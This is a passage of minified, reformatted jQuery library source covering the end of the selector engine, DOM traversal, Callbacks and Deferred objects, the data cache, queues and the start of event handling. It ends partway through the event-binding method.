                        r = f && [],
                        s = [],
                        t = j,
                        u = f || e && d.find.TAG("*", k),
                        v = w += null == t ? 1 : Math.random() || 0.1,
                        x = u.length;
                    for (k && (j = g !== n && g); q !== x && null != (l = u[q]); q++) {
                        if (e && l) {
                            m = 0;
                            while (o = a[m++]) {
                                if (o(l, g, h)) {
                                    i.push(l);
                                    break
                                }
                            }
                            k && (w = v)
                        }
                        c && ((l = !o && l) && p--, f && r.push(l))
                    }
                    if (p += q, c && q !== p) {
                        m = 0;
                        while (o = b[m++]) {
                            o(r, s, g, h)
                        }
                        if (f) {
                            if (p > 0) {
                                while (q--) {
                                    r[q] || s[q] || (s[q] = F.call(i))
                                }
                            }
                            s = va(s)
                        }
                        H.apply(i, s), k && !f && s.length > 0 && p + b.length > 1 && ga.uniqueSort(i)
                    }
                    return k && (w = v, j = t), r
                };
            return c ? ia(f) : f
        }
        return h = ga.compile = function(a, b) {
            var c, d = [],
                e = [],
                f = A[a + " "];
            if (!f) {
                b || (b = g(a)), c = b.length;
                while (c--) {
                    f = xa(b[c]), f[u] ? d.push(f) : e.push(f)
                }
                f = A(a, ya(e, d)), f.selector = a
            }
            return f
        }, i = ga.select = function(a, b, e, f) {
            var i, j, k, l, m, n = "function" == typeof a && a,
                o = !f && g(a = n.selector || a);
            if (e = e || [], 1 === o.length) {
                if (j = o[0] = o[0].slice(0), j.length > 2 && "ID" === (k = j[0]).type && c.getById && 9 === b.nodeType && p && d.relative[j[1].type]) {
                    if (b = (d.find.ID(k.matches[0].replace(ca, da), b) || [])[0], !b) {
                        return e
                    }
                    n && (b = b.parentNode), a = a.slice(j.shift().value.length)
                }
                i = X.needsContext.test(a) ? 0 : j.length;
                while (i--) {
                    if (k = j[i], d.relative[l = k.type]) {
                        break
                    }
                    if ((m = d.find[l]) && (f = m(k.matches[0].replace(ca, da), aa.test(j[0].type) && pa(b.parentNode) || b))) {
                        if (j.splice(i, 1), a = f.length && ra(j), !a) {
                            return H.apply(e, f), e
                        }
                        break
                    }
                }
            }
            return (n || h(a, o))(f, b, !p, e, aa.test(a) && pa(b.parentNode) || b), e
        }, c.sortStable = u.split("").sort(B).join("") === u, c.detectDuplicates = !!l, m(), c.sortDetached = ja(function(a) {
            return 1 & a.compareDocumentPosition(n.createElement("div"))
        }), ja(function(a) {
            return a.innerHTML = "<a href='#'></a>", "#" === a.firstChild.getAttribute("href")
        }) || ka("type|href|height|width", function(a, b, c) {
            return c ? void 0 : a.getAttribute(b, "type" === b.toLowerCase() ? 1 : 2)
        }), c.attributes && ja(function(a) {
            return a.innerHTML = "<input/>", a.firstChild.setAttribute("value", ""), "" === a.firstChild.getAttribute("value")
        }) || ka("value", function(a, b, c) {
            return c || "input" !== a.nodeName.toLowerCase() ? void 0 : a.defaultValue
        }), ja(function(a) {
            return null == a.getAttribute("disabled")
        }) || ka(K, function(a, b, c) {
            var d;
            return c ? void 0 : a[b] === !0 ? b.toLowerCase() : (d = a.getAttributeNode(b)) && d.specified ? d.value : null
        }), ga
    }(a);
    n.find = t, n.expr = t.selectors, n.expr[":"] = n.expr.pseudos, n.unique = t.uniqueSort, n.text = t.getText, n.isXMLDoc = t.isXML, n.contains = t.contains;
    var u = n.expr.match.needsContext,
        v = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
        w = /^.[^:#\[\.,]*$/;

    function x(a, b, c) {
        if (n.isFunction(b)) {
            return n.grep(a, function(a, d) {
                return !!b.call(a, d, a) !== c
            })
        }
        if (b.nodeType) {
            return n.grep(a, function(a) {
                return a === b !== c
            })
        }
        if ("string" == typeof b) {
            if (w.test(b)) {
                return n.filter(b, a, c)
            }
            b = n.filter(b, a)
        }
        return n.grep(a, function(a) {
            return g.call(b, a) >= 0 !== c
        })
    }
    n.filter = function(a, b, c) {
        var d = b[0];
        return c && (a = ":not(" + a + ")"), 1 === b.length && 1 === d.nodeType ? n.find.matchesSelector(d, a) ? [d] : [] : n.find.matches(a, n.grep(b, function(a) {
            return 1 === a.nodeType
        }))
    }, n.fn.extend({
        find: function(a) {
            var b, c = this.length,
                d = [],
                e = this;
            if ("string" != typeof a) {
                return this.pushStack(n(a).filter(function() {
                    for (b = 0; c > b; b++) {
                        if (n.contains(e[b], this)) {
                            return !0
                        }
                    }
                }))
            }
            for (b = 0; c > b; b++) {
                n.find(a, e[b], d)
            }
            return d = this.pushStack(c > 1 ? n.unique(d) : d), d.selector = this.selector ? this.selector + " " + a : a, d
        },
        filter: function(a) {
            return this.pushStack(x(this, a || [], !1))
        },
        not: function(a) {
            return this.pushStack(x(this, a || [], !0))
        },
        is: function(a) {
            return !!x(this, "string" == typeof a && u.test(a) ? n(a) : a || [], !1).length
        }
    });
    var y, z = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,
        A = n.fn.init = function(a, b) {
            var c, d;
            if (!a) {
                return this
            }
            if ("string" == typeof a) {
                if (c = "<" === a[0] && ">" === a[a.length - 1] && a.length >= 3 ? [null, a, null] : z.exec(a), !c || !c[1] && b) {
                    return !b || b.jquery ? (b || y).find(a) : this.constructor(b).find(a)
                }
                if (c[1]) {
                    if (b = b instanceof n ? b[0] : b, n.merge(this, n.parseHTML(c[1], b && b.nodeType ? b.ownerDocument || b : l, !0)), v.test(c[1]) && n.isPlainObject(b)) {
                        for (c in b) {
                            n.isFunction(this[c]) ? this[c](b[c]) : this.attr(c, b[c])
                        }
                    }
                    return this
                }
                return d = l.getElementById(c[2]), d && d.parentNode && (this.length = 1, this[0] = d), this.context = l, this.selector = a, this
            }
            return a.nodeType ? (this.context = this[0] = a, this.length = 1, this) : n.isFunction(a) ? "undefined" != typeof y.ready ? y.ready(a) : a(n) : (void 0 !== a.selector && (this.selector = a.selector, this.context = a.context), n.makeArray(a, this))
        };
    A.prototype = n.fn, y = n(l);
    var B = /^(?:parents|prev(?:Until|All))/,
        C = {
            children: !0,
            contents: !0,
            next: !0,
            prev: !0
        };
    n.extend({
        dir: function(a, b, c) {
            var d = [],
                e = void 0 !== c;
            while ((a = a[b]) && 9 !== a.nodeType) {
                if (1 === a.nodeType) {
                    if (e && n(a).is(c)) {
                        break
                    }
                    d.push(a)
                }
            }
            return d
        },
        sibling: function(a, b) {
            for (var c = []; a; a = a.nextSibling) {
                1 === a.nodeType && a !== b && c.push(a)
            }
            return c
        }
    }), n.fn.extend({
        has: function(a) {
            var b = n(a, this),
                c = b.length;
            return this.filter(function() {
                for (var a = 0; c > a; a++) {
                    if (n.contains(this, b[a])) {
                        return !0
                    }
                }
            })
        },
        closest: function(a, b) {
            for (var c, d = 0, e = this.length, f = [], g = u.test(a) || "string" != typeof a ? n(a, b || this.context) : 0; e > d; d++) {
                for (c = this[d]; c && c !== b; c = c.parentNode) {
                    if (c.nodeType < 11 && (g ? g.index(c) > -1 : 1 === c.nodeType && n.find.matchesSelector(c, a))) {
                        f.push(c);
                        break
                    }
                }
            }
            return this.pushStack(f.length > 1 ? n.unique(f) : f)
        },
        index: function(a) {
            return a ? "string" == typeof a ? g.call(n(a), this[0]) : g.call(this, a.jquery ? a[0] : a) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        },
        add: function(a, b) {
            return this.pushStack(n.unique(n.merge(this.get(), n(a, b))))
        },
        addBack: function(a) {
            return this.add(null == a ? this.prevObject : this.prevObject.filter(a))
        }
    });

    function D(a, b) {
        while ((a = a[b]) && 1 !== a.nodeType) {}
        return a
    }
    n.each({
        parent: function(a) {
            var b = a.parentNode;
            return b && 11 !== b.nodeType ? b : null
        },
        parents: function(a) {
            return n.dir(a, "parentNode")
        },
        parentsUntil: function(a, b, c) {
            return n.dir(a, "parentNode", c)
        },
        next: function(a) {
            return D(a, "nextSibling")
        },
        prev: function(a) {
            return D(a, "previousSibling")
        },
        nextAll: function(a) {
            return n.dir(a, "nextSibling")
        },
        prevAll: function(a) {
            return n.dir(a, "previousSibling")
        },
        nextUntil: function(a, b, c) {
            return n.dir(a, "nextSibling", c)
        },
        prevUntil: function(a, b, c) {
            return n.dir(a, "previousSibling", c)
        },
        siblings: function(a) {
            return n.sibling((a.parentNode || {}).firstChild, a)
        },
        children: function(a) {
            return n.sibling(a.firstChild)
        },
        contents: function(a) {
            return a.contentDocument || n.merge([], a.childNodes)
        }
    }, function(a, b) {
        n.fn[a] = function(c, d) {
            var e = n.map(this, b, c);
            return "Until" !== a.slice(-5) && (d = c), d && "string" == typeof d && (e = n.filter(d, e)), this.length > 1 && (C[a] || n.unique(e), B.test(a) && e.reverse()), this.pushStack(e)
        }
    });
    var E = /\S+/g,
        F = {};

    function G(a) {
        var b = F[a] = {};
        return n.each(a.match(E) || [], function(a, c) {
            b[c] = !0
        }), b
    }
    n.Callbacks = function(a) {
        a = "string" == typeof a ? F[a] || G(a) : n.extend({}, a);
        var b, c, d, e, f, g, h = [],
            i = !a.once && [],
            j = function(l) {
                for (b = a.memory && l, c = !0, g = e || 0, e = 0, f = h.length, d = !0; h && f > g; g++) {
                    if (h[g].apply(l[0], l[1]) === !1 && a.stopOnFalse) {
                        b = !1;
                        break
                    }
                }
                d = !1, h && (i ? i.length && j(i.shift()) : b ? h = [] : k.disable())
            },
            k = {
                add: function() {
                    if (h) {
                        var c = h.length;
                        ! function g(b) {
                            n.each(b, function(b, c) {
                                var d = n.type(c);
                                "function" === d ? a.unique && k.has(c) || h.push(c) : c && c.length && "string" !== d && g(c)
                            })
                        }(arguments), d ? f = h.length : b && (e = c, j(b))
                    }
                    return this
                },
                remove: function() {
                    return h && n.each(arguments, function(a, b) {
                        var c;
                        while ((c = n.inArray(b, h, c)) > -1) {
                            h.splice(c, 1), d && (f >= c && f--, g >= c && g--)
                        }
                    }), this
                },
                has: function(a) {
                    return a ? n.inArray(a, h) > -1 : !(!h || !h.length)
                },
                empty: function() {
                    return h = [], f = 0, this
                },
                disable: function() {
                    return h = i = b = void 0, this
                },
                disabled: function() {
                    return !h
                },
                lock: function() {
                    return i = void 0, b || k.disable(), this
                },
                locked: function() {
                    return !i
                },
                fireWith: function(a, b) {
                    return !h || c && !i || (b = b || [], b = [a, b.slice ? b.slice() : b], d ? i.push(b) : j(b)), this
                },
                fire: function() {
                    return k.fireWith(this, arguments), this
                },
                fired: function() {
                    return !!c
                }
            };
        return k
    }, n.extend({
        Deferred: function(a) {
            var b = [
                    ["resolve", "done", n.Callbacks("once memory"), "resolved"],
                    ["reject", "fail", n.Callbacks("once memory"), "rejected"],
                    ["notify", "progress", n.Callbacks("memory")]
                ],
                c = "pending",
                d = {
                    state: function() {
                        return c
                    },
                    always: function() {
                        return e.done(arguments).fail(arguments), this
                    },
                    then: function() {
                        var a = arguments;
                        return n.Deferred(function(c) {
                            n.each(b, function(b, f) {
                                var g = n.isFunction(a[b]) && a[b];
                                e[f[1]](function() {
                                    var a = g && g.apply(this, arguments);
                                    a && n.isFunction(a.promise) ? a.promise().done(c.resolve).fail(c.reject).progress(c.notify) : c[f[0] + "With"](this === d ? c.promise() : this, g ? [a] : arguments)
                                })
                            }), a = null
                        }).promise()
                    },
                    promise: function(a) {
                        return null != a ? n.extend(a, d) : d
                    }
                },
                e = {};
            return d.pipe = d.then, n.each(b, function(a, f) {
                var g = f[2],
                    h = f[3];
                d[f[1]] = g.add, h && g.add(function() {
                    c = h
                }, b[1 ^ a][2].disable, b[2][2].lock), e[f[0]] = function() {
                    return e[f[0] + "With"](this === e ? d : this, arguments), this
                }, e[f[0] + "With"] = g.fireWith
            }), d.promise(e), a && a.call(e, e), e
        },
        when: function(a) {
            var b = 0,
                c = d.call(arguments),
                e = c.length,
                f = 1 !== e || a && n.isFunction(a.promise) ? e : 0,
                g = 1 === f ? a : n.Deferred(),
                h = function(a, b, c) {
                    return function(e) {
                        b[a] = this, c[a] = arguments.length > 1 ? d.call(arguments) : e, c === i ? g.notifyWith(b, c) : --f || g.resolveWith(b, c)
                    }
                },
                i, j, k;
            if (e > 1) {
                for (i = new Array(e), j = new Array(e), k = new Array(e); e > b; b++) {
                    c[b] && n.isFunction(c[b].promise) ? c[b].promise().done(h(b, k, c)).fail(g.reject).progress(h(b, j, i)) : --f
                }
            }
            return f || g.resolveWith(k, c), g.promise()
        }
    });
    var H;
    n.fn.ready = function(a) {
        return n.ready.promise().done(a), this
    }, n.extend({
        isReady: !1,
        readyWait: 1,
        holdReady: function(a) {
            a ? n.readyWait++ : n.ready(!0)
        },
        ready: function(a) {
            (a === !0 ? --n.readyWait : n.isReady) || (n.isReady = !0, a !== !0 && --n.readyWait > 0 || (H.resolveWith(l, [n]), n.fn.triggerHandler && (n(l).triggerHandler("ready"), n(l).off("ready"))))
        }
    });

    function I() {
        l.removeEventListener("DOMContentLoaded", I, !1), a.removeEventListener("load", I, !1), n.ready()
    }
    n.ready.promise = function(b) {
        return H || (H = n.Deferred(), "complete" === l.readyState ? setTimeout(n.ready) : (l.addEventListener("DOMContentLoaded", I, !1), a.addEventListener("load", I, !1))), H.promise(b)
    }, n.ready.promise();
    var J = n.access = function(a, b, c, d, e, f, g) {
        var h = 0,
            i = a.length,
            j = null == c;
        if ("object" === n.type(c)) {
            e = !0;
            for (h in c) {
                n.access(a, b, h, c[h], !0, f, g)
            }
        } else {
            if (void 0 !== d && (e = !0, n.isFunction(d) || (g = !0), j && (g ? (b.call(a, d), b = null) : (j = b, b = function(a, b, c) {
                    return j.call(n(a), c)
                })), b)) {
                for (; i > h; h++) {
                    b(a[h], c, g ? d : d.call(a[h], h, b(a[h], c)))
                }
            }
        }
        return e ? a : j ? b.call(a) : i ? b(a[0], c) : f
    };
    n.acceptData = function(a) {
        return 1 === a.nodeType || 9 === a.nodeType || !+a.nodeType
    };

    function K() {
        Object.defineProperty(this.cache = {}, 0, {
            get: function() {
                return {}
            }
        }), this.expando = n.expando + K.uid++
    }
    K.uid = 1, K.accepts = n.acceptData, K.prototype = {
        key: function(a) {
            if (!K.accepts(a)) {
                return 0
            }
            var b = {},
                c = a[this.expando];
            if (!c) {
                c = K.uid++;
                try {
                    b[this.expando] = {
                        value: c
                    }, Object.defineProperties(a, b)
                } catch (d) {
                    b[this.expando] = c, n.extend(a, b)
                }
            }
            return this.cache[c] || (this.cache[c] = {}), c
        },
        set: function(a, b, c) {
            var d, e = this.key(a),
                f = this.cache[e];
            if ("string" == typeof b) {
                f[b] = c
            } else {
                if (n.isEmptyObject(f)) {
                    n.extend(this.cache[e], b)
                } else {
                    for (d in b) {
                        f[d] = b[d]
                    }
                }
            }
            return f
        },
        get: function(a, b) {
            var c = this.cache[this.key(a)];
            return void 0 === b ? c : c[b]
        },
        access: function(a, b, c) {
            var d;
            return void 0 === b || b && "string" == typeof b && void 0 === c ? (d = this.get(a, b), void 0 !== d ? d : this.get(a, n.camelCase(b))) : (this.set(a, b, c), void 0 !== c ? c : b)
        },
        remove: function(a, b) {
            var c, d, e, f = this.key(a),
                g = this.cache[f];
            if (void 0 === b) {
                this.cache[f] = {}
            } else {
                n.isArray(b) ? d = b.concat(b.map(n.camelCase)) : (e = n.camelCase(b), b in g ? d = [b, e] : (d = e, d = d in g ? [d] : d.match(E) || [])), c = d.length;
                while (c--) {
                    delete g[d[c]]
                }
            }
        },
        hasData: function(a) {
            return !n.isEmptyObject(this.cache[a[this.expando]] || {})
        },
        discard: function(a) {
            a[this.expando] && delete this.cache[a[this.expando]]
        }
    };
    var L = new K,
        M = new K,
        N = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
        O = /([A-Z])/g;

    function P(a, b, c) {
        var d;
        if (void 0 === c && 1 === a.nodeType) {
            if (d = "data-" + b.replace(O, "-$1").toLowerCase(), c = a.getAttribute(d), "string" == typeof c) {
                try {
                    c = "true" === c ? !0 : "false" === c ? !1 : "null" === c ? null : +c + "" === c ? +c : N.test(c) ? n.parseJSON(c) : c
                } catch (e) {}
                M.set(a, b, c)
            } else {
                c = void 0
            }
        }
        return c
    }
    n.extend({
        hasData: function(a) {
            return M.hasData(a) || L.hasData(a)
        },
        data: function(a, b, c) {
            return M.access(a, b, c)
        },
        removeData: function(a, b) {
            M.remove(a, b)
        },
        _data: function(a, b, c) {
            return L.access(a, b, c)
        },
        _removeData: function(a, b) {
            L.remove(a, b)
        }
    }), n.fn.extend({
        data: function(a, b) {
            var c, d, e, f = this[0],
                g = f && f.attributes;
            if (void 0 === a) {
                if (this.length && (e = M.get(f), 1 === f.nodeType && !L.get(f, "hasDataAttrs"))) {
                    c = g.length;
                    while (c--) {
                        g[c] && (d = g[c].name, 0 === d.indexOf("data-") && (d = n.camelCase(d.slice(5)), P(f, d, e[d])))
                    }
                    L.set(f, "hasDataAttrs", !0)
                }
                return e
            }
            return "object" == typeof a ? this.each(function() {
                M.set(this, a)
            }) : J(this, function(b) {
                var c, d = n.camelCase(a);
                if (f && void 0 === b) {
                    if (c = M.get(f, a), void 0 !== c) {
                        return c
                    }
                    if (c = M.get(f, d), void 0 !== c) {
                        return c
                    }
                    if (c = P(f, d, void 0), void 0 !== c) {
                        return c
                    }
                } else {
                    this.each(function() {
                        var c = M.get(this, d);
                        M.set(this, d, b), -1 !== a.indexOf("-") && void 0 !== c && M.set(this, a, b)
                    })
                }
            }, null, b, arguments.length > 1, null, !0)
        },
        removeData: function(a) {
            return this.each(function() {
                M.remove(this, a)
            })
        }
    }), n.extend({
        queue: function(a, b, c) {
            var d;
            return a ? (b = (b || "fx") + "queue", d = L.get(a, b), c && (!d || n.isArray(c) ? d = L.access(a, b, n.makeArray(c)) : d.push(c)), d || []) : void 0
        },
        dequeue: function(a, b) {
            b = b || "fx";
            var c = n.queue(a, b),
                d = c.length,
                e = c.shift(),
                f = n._queueHooks(a, b),
                g = function() {
                    n.dequeue(a, b)
                };
            "inprogress" === e && (e = c.shift(), d--), e && ("fx" === b && c.unshift("inprogress"), delete f.stop, e.call(a, g, f)), !d && f && f.empty.fire()
        },
        _queueHooks: function(a, b) {
            var c = b + "queueHooks";
            return L.get(a, c) || L.access(a, c, {
                empty: n.Callbacks("once memory").add(function() {
                    L.remove(a, [b + "queue", c])
                })
            })
        }
    }), n.fn.extend({
        queue: function(a, b) {
            var c = 2;
            return "string" != typeof a && (b = a, a = "fx", c--), arguments.length < c ? n.queue(this[0], a) : void 0 === b ? this : this.each(function() {
                var c = n.queue(this, a, b);
                n._queueHooks(this, a), "fx" === a && "inprogress" !== c[0] && n.dequeue(this, a)
            })
        },
        dequeue: function(a) {
            return this.each(function() {
                n.dequeue(this, a)
            })
        },
        clearQueue: function(a) {
            return this.queue(a || "fx", [])
        },
        promise: function(a, b) {
            var c, d = 1,
                e = n.Deferred(),
                f = this,
                g = this.length,
                h = function() {
                    --d || e.resolveWith(f, [f])
                };
            "string" != typeof a && (b = a, a = void 0), a = a || "fx";
            while (g--) {
                c = L.get(f[g], a + "queueHooks"), c && c.empty && (d++, c.empty.add(h))
            }
            return h(), e.promise(b)
        }
    });
    var Q = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
        R = ["Top", "Right", "Bottom", "Left"],
        S = function(a, b) {
            return a = b || a, "none" === n.css(a, "display") || !n.contains(a.ownerDocument, a)
        },
        T = /^(?:checkbox|radio)$/i;
    ! function() {
        var a = l.createDocumentFragment(),
            b = a.appendChild(l.createElement("div")),
            c = l.createElement("input");
        c.setAttribute("type", "radio"), c.setAttribute("checked", "checked"), c.setAttribute("name", "t"), b.appendChild(c), k.checkClone = b.cloneNode(!0).cloneNode(!0).lastChild.checked, b.innerHTML = "<textarea>x</textarea>", k.noCloneChecked = !!b.cloneNode(!0).lastChild.defaultValue
    }();
    var U = "undefined";
    k.focusinBubbles = "onfocusin" in a;
    var V = /^key/,
        W = /^(?:mouse|pointer|contextmenu)|click/,
        X = /^(?:focusinfocus|focusoutblur)$/,
        Y = /^([^.]*)(?:\.(.+)|)$/;

    function Z() {
        return !0
    }

    function $() {
        return !1
    }

    function _() {
        try {
            return l.activeElement
        } catch (a) {}
    }
    n.event = {
        global: {},
        add: function(a, b, c, d, e) {
            var f, g, h, i, j, k, l, m, o, p, q, r = L.get(a);
            if (r) {
                c.handler && (f = c, c = f.handler, e = f.selector), c.guid || (c.guid = n.guid++), (i = r.events) || (i = r.events = {}), (g = r.handle) || (g = r.handle = function(b) {
                    return typeof n !== U && n.event.triggered !== b.type ? n.event.dispatch.apply(a, arguments) : void 0
                }), b = (b || "").match(E) || [""], j = b.length;
                while (j--) {
                    h = Y.exec(b[j]) || [], o = q = h[1], p = (h[2] || "").split(".").sort(), o && (l = n.event.special[o] || {}, o = (e ? l.delegateType : l.bindType) || o, l = n.event.special[o] || {}, k = n.extend({
                        type: o,
                        origType: q,
                        data: d,
                        handler: c,
                        guid: c.guid,
                        selector: e,
                        needsContext: e && n.expr.match.needsContext.test(e),
                        namespace: p.join(".")
                    }, f), (m = i[o]) || (m = i[o] = [], m.delegateCount = 0, l.setup && l.setup.call(a, d, p, g) !== !1 || a.addEventListener && a.addEventListener(o, g, !1)), l.add && (l.add.call(a, k), k.handler.guid || (k.handler.guid = c.guid)), e ? m.splice(m.delegateCount++, 0, k) : m.push(k), n.event.global[o] = !0)
                }
            }
        },
        remove: function(a, b, c, d, e) {
            var f, g, h, i, j, k, l, m, o, p, q, r = L.hasData(a) && L.get(a);
            if (r && (i = r.events)) {
                b = (b || "").match(E) || [""], j = b.length;
                while (j--) {
                    if (h = Y.exec(b[j]) || [], o = q = h[1], p = (h[2] || "").split(".").sort(), o) {
                        l = n.event.special[o] || {}, o = (d ? l.delegateType : l.bindType) || o, m = i[o] || [], h = h[2] && new RegExp("(^|\\.)" + p.join("\\.(?:.*\\.|)") + "(\\.|$)"), g = f = m.length;
                        while (f--) {
                            k = m[f], !e && q !== k.origType || c && c.guid !== k.guid || h && !h.test(k.namespace) || d && d !== k.selector && ("**" !== d || !k.selector) || (m.splice(f, 1), k.selector && m.delegateCount--, l.remove && l.remove.call(a, k))
                        }
                        g && !m.length && (l.teardown && l.teardown.call(a, p, r.handle) !== !1 || n.removeEvent(a, o, r.handle), delete i[o])
                    } else {
                        for (o in i) {
                            n.event.remove(a, o + b[j], c, d, !0)
                        }
                    }
                }
                n.isEmptyObject(i) && (delete r.handle, L.remove(a, "events"))
            }
        },
        trigger: function(b, c, d, e) {
            var f, g, h, i, k, m, o, p = [d || l],
                q = j.call(b, "type") ? b.type : b,
                r = j.call(b, "namespace") ? b.namespace.split(".") : [];
            if (g = h = d = d || l, 3 !== d.nodeType && 8 !== d.nodeType && !X.test(q + n.event.triggered) && (q.indexOf(".") >= 0 && (r = q.split("."), q = r.shift(), r.sort()), k = q.indexOf(":") < 0 && "on" + q, b = b[n.expando] ? b : new n.Event(q, "object" == typeof b && b), b.isTrigger = e ? 2 : 3, b.namespace = r.join("."), b.namespace_re = b.namespace ? new RegExp("(^|\\.)" + r.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, b.result = void 0, b.target || (b.target = d), c = null == c ? [b] : n.makeArray(c, [b]), o = n.event.special[q] || {}, e || !o.trigger || o.trigger.apply(d, c) !== !1)) {
                if (!e && !o.noBubble && !n.isWindow(d)) {
                    for (i = o.delegateType || q, X.test(i + q) || (g = g.parentNode); g; g = g.parentNode) {
                        p.push(g), h = g
                    }
                    h === (d.ownerDocument || l) && p.push(h.defaultView || h.parentWindow || a)
                }
                f = 0;
                while ((g = p[f++]) && !b.isPropagationStopped()) {
                    b.type = f > 1 ? i : o.bindType || q, m = (L.get(g, "events") || {})[b.type] && L.get(g, "handle"), m && m.apply(g, c), m = k && g[k], m && m.apply && n.acceptData(g) && (b.result = m.apply(g, c), b.result === !1 && b.preventDefault())
                }
                return b.type = q, e || b.isDefaultPrevented() || o._default && o._default.apply(p.pop(), c) !== !1 || !n.acceptData(d) || k && n.isFunction(d[q]) && !n.isWindow(d) && (h = d[k], h && (d[k] = null), n.event.triggered = q, d[q](), n.event.triggered = void 0, h && (d[k] = h)), b.result
            }
        },
        dispatch: function(a) {
            a = n.event.fix(a);
            var b, c, e, f, g, h = [],
                i = d.call(arguments),
                j = (L.get(this, "events") || {})[a.type] || [],
                k = n.event.special[a.type] || {};
            if (i[0] = a, a.delegateTarget = this, !k.preDispatch || k.preDispatch.call(this, a) !== !1) {
                h = n.event.handlers.call(this, a, j), b = 0;
                while ((f = h[b++]) && !a.isPropagationStopped()) {
                    a.currentTarget = f.elem, c = 0;
                    while ((g = f.handlers[c++]) && !a.isImmediatePropagationStopped()) {
                        (!a.namespace_re || a.namespace_re.test(g.namespace)) && (a.handleObj = g, a.data = g.data, e = ((n.event.special[g.origType] || {}).handle || g.handler).apply(f.elem, i), void 0 !== e && (a.result = e) === !1 && (a.preventDefault(), a.stopPropagation()))
                    }
                }
                return k.postDispatch && k.postDispatch.call(this, a), a.result
            }
        },
        handlers: function(a, b) {
            var c, d, e, f, g = [],
                h = b.delegateCount,
                i = a.target;
            if (h && i.nodeType && (!a.button || "click" !== a.type)) {
                for (; i !== this; i = i.parentNode || this) {
                    if (i.disabled !== !0 || "click" !== a.type) {
                        for (d = [], c = 0; h > c; c++) {
                            f = b[c], e = f.selector + " ", void 0 === d[e] && (d[e] = f.needsContext ? n(e, this).index(i) >= 0 : n.find(e, this, null, [i]).length), d[e] && d.push(f)
                        }
                        d.length && g.push({
                            elem: i,
                            handlers: d
                        })
                    }
                }
            }
            return h < b.length && g.push({
                elem: this,
                handlers: b.slice(h)
            }), g
        },
        props: "altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
        fixHooks: {},
        keyHooks: {
            props: "char charCode key keyCode".split(" "),
            filter: function(a, b) {
                return null == a.which && (a.which = null != b.charCode ? b.charCode : b.keyCode), a
            }
        },
        mouseHooks: {
            props: "button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
            filter: function(a, b) {
                var c, d, e, f = b.button;
                return null == a.pageX && null != b.clientX && (c = a.target.ownerDocument || l, d = c.documentElement, e = c.body, a.pageX = b.clientX + (d && d.scrollLeft || e && e.scrollLeft || 0) - (d && d.clientLeft || e && e.clientLeft || 0), a.pageY = b.clientY + (d && d.scrollTop || e && e.scrollTop || 0) - (d && d.clientTop || e && e.clientTop || 0)), a.which || void 0 === f || (a.which = 1 & f ? 1 : 2 & f ? 3 : 4 & f ? 2 : 0), a
            }
        },
        fix: function(a) {
            if (a[n.expando]) {
                return a
            }
            var b, c, d, e = a.type,
                f = a,
                g = this.fixHooks[e];
            g || (this.fixHooks[e] = g = W.test(e) ? this.mouseHooks : V.test(e) ? this.keyHooks : {}), d = g.props ? this.props.concat(g.props) : this.props, a = new n.Event(f), b = d.length;
            while (b--) {
                c = d[b], a[c] = f[c]
            }
            return a.target || (a.target = l), 3 === a.target.nodeType && (a.target = a.target.parentNode), g.filter ? g.filter(a, f) : a
        },
        special: {
            load: {
                noBubble: !0
            },
            focus: {
                trigger: function() {
                    return this !== _() && this.focus ? (this.focus(), !1) : void 0
                },
                delegateType: "focusin"
            },
            blur: {
                trigger: function() {
                    return this === _() && this.blur ? (this.blur(), !1) : void 0
                },
                delegateType: "focusout"
            },
            click: {
                trigger: function() {
                    return "checkbox" === this.type && this.click && n.nodeName(this, "input") ? (this.click(), !1) : void 0
                },
                _default: function(a) {
                    return n.nodeName(a.target, "a")
                }
            },
            beforeunload: {
                postDispatch: function(a) {
                    void 0 !== a.result && a.originalEvent && (a.originalEvent.returnValue = a.result)
                }
            }
        },
        simulate: function(a, b, c, d) {
            var e = n.extend(new n.Event, c, {
                type: a,
                isSimulated: !0,
                originalEvent: {}
            });
            d ? n.event.trigger(e, null, b) : n.event.dispatch.call(b, e), e.isDefaultPrevented() && c.preventDefault()
        }
    }, n.removeEvent = function(a, b, c) {
        a.removeEventListener && a.removeEventListener(b, c, !1)
    }, n.Event = function(a, b) {
        return this instanceof n.Event ? (a && a.type ? (this.originalEvent = a, this.type = a.type, this.isDefaultPrevented = a.defaultPrevented || void 0 === a.defaultPrevented && a.returnValue === !1 ? Z : $) : this.type = a, b && n.extend(this, b), this.timeStamp = a && a.timeStamp || n.now(), void(this[n.expando] = !0)) : new n.Event(a, b)
    }, n.Event.prototype = {
        isDefaultPrevented: $,
        isPropagationStopped: $,
        isImmediatePropagationStopped: $,
        preventDefault: function() {
            var a = this.originalEvent;
            this.isDefaultPrevented = Z, a && a.preventDefault && a.preventDefault()
        },
        stopPropagation: function() {
            var a = this.originalEvent;
            this.isPropagationStopped = Z, a && a.stopPropagation && a.stopPropagation()
        },
        stopImmediatePropagation: function() {
            var a = this.originalEvent;
            this.isImmediatePropagationStopped = Z, a && a.stopImmediatePropagation && a.stopImmediatePropagation(), this.stopPropagation()
        }
    }, n.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout"
    }, function(a, b) {
        n.event.special[a] = {
            delegateType: b,
            bindType: b,
            handle: function(a) {
                var c, d = this,
                    e = a.relatedTarget,
                    f = a.handleObj;
                return (!e || e !== d && !n.contains(d, e)) && (a.type = f.origType, c = f.handler.apply(this, arguments), a.type = b), c
            }
        }
    }), k.focusinBubbles || n.each({
        focus: "focusin",
        blur: "focusout"
    }, function(a, b) {
        var c = function(a) {
            n.event.simulate(b, a.target, n.event.fix(a), !0)
        };
        n.event.special[b] = {
            setup: function() {
                var d = this.ownerDocument || this,
                    e = L.access(d, b);
                e || d.addEventListener(a, c, !0), L.access(d, b, (e || 0) + 1)
            },
            teardown: function() {
                var d = this.ownerDocument || this,
                    e = L.access(d, b) - 1;
                e ? L.access(d, b, e) : (d.removeEventListener(a, c, !0), L.remove(d, b))
            }
        }
    }), n.fn.extend({
        on: function(a, b, c, d, e) {
            var f, g;
            if ("object" == typeof a) {
                "string" != typeof b && (c = c || b, b = void 0);
                for (g in a) {
